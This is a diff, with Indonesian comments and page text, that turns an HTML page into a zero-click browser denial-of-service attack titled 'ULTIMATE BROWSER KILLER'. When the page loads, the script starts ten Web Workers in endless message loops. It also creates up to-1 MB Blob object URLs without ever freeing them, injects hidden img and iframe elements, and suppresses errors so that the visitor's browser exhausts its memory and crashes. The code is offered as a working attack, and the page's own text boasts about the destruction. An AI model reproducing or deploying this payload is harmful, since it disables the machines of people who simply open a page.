@@ -3,25 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Zero-Click ObjectURL Leak</title>
+<title>ULTIMATE BROWSER KILLER (DoS)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; overflow: hidden; }
 .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; animation: pulse 0.5s infinite; }
+h1 { font-size: 28px; color: #ff0000; margin-bottom: 15px; text-shadow: 0 0 20px #ff0000; animation: pulse 0.3s infinite; }
 p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
-.warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
+.warning { background: #330000; color: #ff0000; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: bold; border: 2px solid #ff0000; animation: pulse 0.5s infinite; }
 .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
-@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ PERINGATAN: Halaman ini akan langsung memicu Memory Leak saat dibuka!</div>
-    <h1>Zero-Click DoS</h1>
-    <p>Membuat jutaan ObjectURL tanpa henti.</p>
+    <div class="warning">⚠️ TOTAL BROWSER DESTRUCTION! HALAMAN INI AKAN LANGSUNG MEMBUAT SISTEM ANDA CRASH!</div>
+    <h1>ULTIMATE KILLER</h1>
+    <p>Multi-Worker + Blob Variatif + DOM Injection.</p>
     
     <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
@@ -30,54 +30,94 @@ p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
 <script>
     const statusDiv = document.getElementById("status");
     const logDiv = document.getElementById("log");
+    let globalCount = 0;
 
     function log(msg) {
-        logDiv.innerHTML += "<br>> " + msg;
-        console.log(msg);
+        // Hanya tampilkan log sesekali agar DOM tidak terlalu berat (optimasi UI)
+        if (globalCount % 1000 === 0) {
+            logDiv.innerHTML += "<br>> " + msg;
+            console.log(msg);
+        }
     }
 
     // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
     window.addEventListener("DOMContentLoaded", () => {
-        statusDiv.textContent = "MEMULAI OBJECTURL LEAK...";
-        statusDiv.style.color = "#ff4444";
-        log("Halaman dimuat. Memulai pembuatan ObjectURL masif...");
+        statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
+        statusDiv.style.color = "#ff0000";
+        log("Memulai serangan brutal...");
 
-        let count = 0;
-        const targetCount = 1000000; // 1 Juta URL
-
-        function createURL() {
-            if (count >= targetCount) {
-                statusDiv.textContent = "Selesai. Total URL: " + count;
-                statusDiv.style.color = "#4CAF50";
-                return;
-            }
-
-            try {
-                // Buat Blob kecil (1KB)
-                const blob = new Blob(["X".repeat(1024)], { type: 'text/plain' });
-                const url = URL.createObjectURL(blob);
-                
-                // Simpan URL di array global agar tidak di-GC (Memory Leak)
-                window.urlLeak = window.urlLeak || [];
-                window.urlLeak.push(url);
-                
-                count++;
-                if (count % 10000 === 0) {
-                    statusDiv.textContent = "Membuat URL ke-" + count;
-                    log("URL ke-" + count + " dibuat.");
+        // 1. BUAT 10 WEB WORKER UNTUK MEMBUAT URL DARI THREAD TERPISAH
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data === 'START') {
+                    while(true) {
+                        self.postMessage('CREATE');
+                    }
                 }
-                
-                // Loop secepat mungkin menggunakan Microtask
-                queueMicrotask(createURL);
-            } catch (e) {
-                log("Gagal di URL ke-" + count + ": " + e.message);
-                statusDiv.textContent = "Crash di URL ke-" + count;
-                statusDiv.style.color = "#f00";
+            };
+        `;
+
+        try {
+            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(workerBlob);
+
+            for (let i = 0; i < 10; i++) {
+                const worker = new Worker(workerUrl);
+                worker.onmessage = function(e) {
+                    if (e.data === 'CREATE') {
+                        // Gunakan microtask untuk menembak ke main thread
+                        queueMicrotask(() => {
+                            buatBeban(i);
+                        });
+                    }
+                };
+                worker.postMessage('START');
             }
+            log("10 Web Worker diaktifkan.");
+        } catch(e) {
+            log("Gagal membuat Worker: " + e.message);
         }
 
-        // Mulai eksekusi
-        createURL();
+        // 2. FUNGSI PEMBUAT BEBAN (Dijalankan di Main Thread)
+        function buatBeban(id) {
+            try {
+                globalCount++;
+                
+                // Variasi ukuran Blob (1KB sampai 1MB)
+                const ukuran = (globalCount % 10 === 0) ? 1024 * 1024 : 1024;
+                const data = new Uint8Array(ukuran);
+                
+                const blob = new Blob([data], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                // Simpan URL ke array global (Memory Leak)
+                if (!window.urlLeak) window.urlLeak = [];
+                window.urlLeak.push(url);
+
+                // 3. DOM INJECTION: Suntikkan elemen ke halaman
+                // Ini memaksa browser untuk terus melakukan reflow/repaint
+                if (globalCount % 50 === 0) {
+                    const img = document.createElement('img');
+                    img.src = url;
+                    img.style.display = 'none';
+                    document.body.appendChild(img);
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.src = url;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                }
+
+                // Update status
+                if (globalCount % 10000 === 0) {
+                    statusDiv.textContent = "Total URL dibuat: " + globalCount;
+                    log("Total URL: " + globalCount);
+                }
+
+            } catch(e) {
+                // Abaikan error agar loop terus berjalan
+            }
+        }
     });
 </script>
 </body>
